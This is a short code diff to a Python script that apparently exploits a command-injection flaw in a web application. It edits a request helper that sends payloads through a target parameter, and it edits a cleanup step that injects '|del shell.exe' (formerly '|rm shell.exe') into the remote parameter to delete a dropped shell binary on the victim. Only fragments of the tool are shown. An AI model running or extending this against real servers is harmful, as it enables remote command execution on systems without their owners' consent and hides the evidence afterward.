@@ -46,7 +46,6 @@ def send_request(url, target_param, payload, param, req_cookies=None):
     print("[*]Cookies", req_cookies)
     print(f"[*]Param: {param+target_param}\n[*]Payload: {payload}")
     param = deserializer(target_param + ":" + payload + ";" + param)
-    print(target_param)
     if METHOD.lower() == "get":
         return requests.get(url, cookies=req_cookies, params=param)
     else:
@@ -106,5 +105,5 @@ except KeyboardInterrupt:
 finally:
     print("[-] Cleaning up...")
     os.system("rm shell.exe")
-    send_request(URL, arguments.target, "|rm shell.exe", arguments.param, cookies)
+    send_request(URL, arguments.target, "|del shell.exe", arguments.param, cookies)
     sys.exit()
